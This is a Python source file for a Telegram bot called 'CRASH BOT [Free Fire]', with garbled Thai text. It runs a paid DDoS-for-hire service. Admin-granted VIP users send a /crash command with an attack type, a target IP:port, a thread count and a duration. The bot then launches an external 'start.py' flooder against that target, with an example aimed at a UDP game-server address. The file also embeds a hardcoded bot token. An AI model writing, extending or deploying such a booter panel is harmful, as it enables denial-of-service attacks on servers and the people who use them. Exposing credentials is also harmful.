import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ö‡∏≠‡∏ó‡πÅ‡∏•‡∏∞‡πÅ‡∏≠‡∏î‡∏°‡∏¥‡∏ô
BOT_TOKEN = "7929038707:AAHq52QK_p2TLxSPF4f-Q51Fb8oV1uIM9qc"
ADMIN_ID = 7520172820
START_PY_PATH = "start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

# ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• SQLite
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()

# ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á /start
@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "‚ùå *‡πÅ‡∏û‡πá‡∏Ñ‡πÄ‡∏Å‡∏à VIP ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì‡∏´‡∏°‡∏î‡∏≠‡∏≤‡∏¢‡∏∏‡πÅ‡∏•‡πâ‡∏ß!*"
        else:
            days_remaining = (expiration_date - datetime.now()).days
            vip_status = (
                f"‚úÖ *‡∏•‡∏π‡∏Å‡∏Ñ‡πâ‡∏≤ VIP!*\n"
                f"‚è≥ *‡∏ß‡∏±‡∏ô‡∏Ñ‡∏á‡πÄ‡∏´‡∏•‡∏∑‡∏≠:* {days_remaining} ‡∏ß‡∏±‡∏ô\n"
                f"üìÖ *‡∏´‡∏°‡∏î‡∏≠‡∏≤‡∏¢‡∏∏:* {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "‚ùå *‡∏Ñ‡∏∏‡∏ì‡πÑ‡∏°‡πà‡∏°‡∏µ‡πÅ‡∏û‡πá‡∏Ñ‡πÄ‡∏Å‡∏à VIP ‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡∏≠‡∏¢‡∏π‡πà!*"

    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="üíª ‡∏ï‡∏¥‡∏î‡∏ï‡πà‡∏≠‡∏ú‡∏π‡πâ‡∏î‡∏π‡πÅ‡∏• üíª",
        url=f"tg://user?id={ADMIN_ID}"
    )
    markup.add(button)

    bot.reply_to(
        message,
        (
            "ü§ñ *‡∏¢‡∏¥‡∏ô‡∏î‡∏µ‡∏ï‡πâ‡∏≠‡∏ô‡∏£‡∏±‡∏ö‡∏™‡∏π‡πà CRASH BOT [Free Fire]!*"
            f"""
{vip_status}
\n"""
            "üìå *‡∏ß‡∏¥‡∏ò‡∏µ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô:*"
            """
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>
\n"""
 "üí° *‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á:*"
            """
/crash UDP 143.92.125.230:10013 10 900
\n"""
            "üí† KrizzZModz üáµüá™ USERS VIP üí†"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )

# ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á /vip (‡πÄ‡∏û‡∏¥‡πà‡∏° VIP)
@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "‚ùå ‡∏Ñ‡∏∏‡∏ì‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡πÄ‡∏û‡∏¥‡πà‡∏° VIP!")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "‚ùå ‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á! ‡πÉ‡∏ä‡πâ: /vip <ID> <‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏ß‡∏±‡∏ô>",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"‚úÖ ‡πÄ‡∏û‡∏¥‡πà‡∏° {telegram_id} ‡πÄ‡∏õ‡πá‡∏ô VIP ‡πÄ‡∏õ‡πá‡∏ô‡πÄ‡∏ß‡∏•‡∏≤ {days} ‡∏ß‡∏±‡∏ô‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß!")

# ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á /crash (‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ)
@bot.message_handler(commands=["crash"])
def handle_crash(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "‚ùå ‡∏Ñ‡∏∏‡∏ì‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡πÉ‡∏ä‡πâ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ô‡∏µ‡πâ!")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "‚ùå ‡πÅ‡∏û‡πá‡∏Ñ‡πÄ‡∏Å‡∏à VIP ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì‡∏´‡∏°‡∏î‡∏≠‡∏≤‡∏¢‡∏∏‡πÅ‡∏•‡πâ‡∏ß!")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "‚ùå ‡πÇ‡∏õ‡∏£‡∏î‡∏£‡∏≠ 10 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ‡∏Å‡πà‡∏≠‡∏ô‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÉ‡∏´‡∏°‡πà!")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "‚ùå *‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á!*\n\n"
                "üìå *‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á:*\n"
                "/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\n"
                "üí° *‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á:*\n"
                "/crash UDP 143.92.125.230:10013 10 900"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("‚õî ‡∏´‡∏¢‡∏∏‡∏î‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[‚úÖ] ‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô‡πÅ‡∏•‡πâ‡∏ß! [‚úÖ]*\n\n"
            f"üåê *‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢:* {ip_port}\n"
            f"‚öôÔ∏è *‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:* {attack_type}\n"
            f"üßü‚Äç‚ôÄÔ∏è *‡πÄ‡∏ò‡∏£‡∏î:* {threads}\n"
            f"‚è≥ *‡∏£‡∏∞‡∏¢‡∏∞‡πÄ‡∏ß‡∏•‡∏≤ (ms):* {duration}\n\n"
            f"üí† KrizzZModz üáµüá™ USERS VIP üí†"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )

# ‡∏õ‡∏∏‡πà‡∏°‡∏´‡∏¢‡∏∏‡∏î‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(call.id, "‚ùå ‡∏Ñ‡∏∏‡∏ì‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡∏´‡∏¢‡∏∏‡∏î‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏Ç‡∏≠‡∏á‡∏ú‡∏π‡πâ‡∏≠‡∏∑‡πà‡∏ô!")
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "‚úÖ ‡∏´‡∏¢‡∏∏‡∏î‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß!")
        bot.edit_message_text(
            "*[‚õî] ‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏´‡∏¢‡∏∏‡∏î‡πÅ‡∏•‡πâ‡∏ß! [‚õî]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÉ‡∏î‡πÜ ‡∏ó‡∏µ‡πà‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏≠‡∏¢‡∏π‡πà!")

if __name__ == "__main__":
    bot.infinity_polling()
